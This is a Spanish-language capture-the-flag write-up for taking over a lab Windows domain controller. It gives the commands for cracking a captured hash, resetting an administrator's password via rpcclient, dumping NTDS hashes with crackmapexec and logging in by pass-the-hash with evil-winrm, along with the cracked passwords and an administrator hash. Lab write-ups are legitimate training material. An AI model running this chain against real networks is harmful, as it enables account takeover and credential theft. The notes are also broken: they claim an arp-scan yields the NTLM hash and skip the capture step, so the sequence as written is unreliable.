## Reconocimiento

Voy a establecer en el fichero **/etc/hosts** la **ip de la mv objetivo**, la voy a asignar el nombre del dominio **SOUPEDECODE.LOCAL**

**ARP-SCAN**

Ejecutamos el siguiente comando:

```
sudo arp-scan -I eth0 --localnet --ignoredups
```

Nos dará el **hash NTLM** del usuario **xkate578**

A continuación usaremos la herramienta hashcat para descifrar la contraseña del usuario **xkate578**, guardaremos el hash NTLM en un archivo llamado **hash_xkate578**

```
hashcat -m 5600 hash_xkate578 /usr/share/wordlists/rockyou.txt 
```

La contraseña es **jesuschrist**

Por tanto, las credenciales quedarían de la siguiente forma:

**xkate578**:**jesuschrist**

Ahora vamos a validar este usuario con el dominio con la herramienta crackmapexec.

```
crackmapexec smb 192.168.0.109 -u 'xkate578' -p 'jesuschrist'
```

> SMB         192.168.0.109   445    DC01             [*] Windows Server 2022 Build 20348 x64 (name:DC01) (domain:SOUPEDECODE.LOCAL) (signing:True) (SMBv1:False)

## Escalada de Privilegios

El usuario **fbeth103** tiene permiso de administrador. Podríamos probar en cambiarle la contraseña este usuario para así obtener acceso a su cuenta. En el caso de que no te deje cambiar su contraseña, debería de borrar y volver a crear la máquina y ya te dejará. Tener en cuenta que si hacemos esto la ip de la maquina objetivo cambiará.

![[rpcclient error.png]]

Dentro de rpcclient usaremos el siguiente comando para cambiar la contraseña al usuario **fbeth103**, Investigando me deja realizarlo porque ese usuario tiene el permiso de que cualquier cuenta puede cambiarle la contraseña, algo gravísima. 

```
rpcclient -U "xkate578%jesuschrist" 192.168.0.104
setuserinfo2 fbeth103 23 pass123!!
```

![[passOOK.png]]

```
crackmapexec smb 192.168.0.104 -d 'SOUPEDECODE.LOCAL' -u 'fbeth103' -p 'pass123!!'
```

![[pwn3d.png]]

A continuación el parámetro **ntds** permite obtener los hashes de las contraseñas, pero claro necesitamos antes ser usuario admin para poder llevarlo acabo.

```
crackmapexec smb 192.168.0.104 -d 'SOUPEDECODE.LOCAL' -u 'fbeth103' -p 'pass123!!' --ntds
```

![[hash ntlv2.png]]

Credenciales --> **Administrator**:**2176416a80e4f62804f101d3a55d6c93**

Al estar abierto el puerto **5985** podemos usar la herramienta evil-WinRM usando como contraseña el hash.

```
evil-winrm -i 192.168.0.104 -u 'Administrator' -H '2176416a80e4f62804f101d3a55d6c93'
type C:\Users\Administrator\desktop\root.txt
```
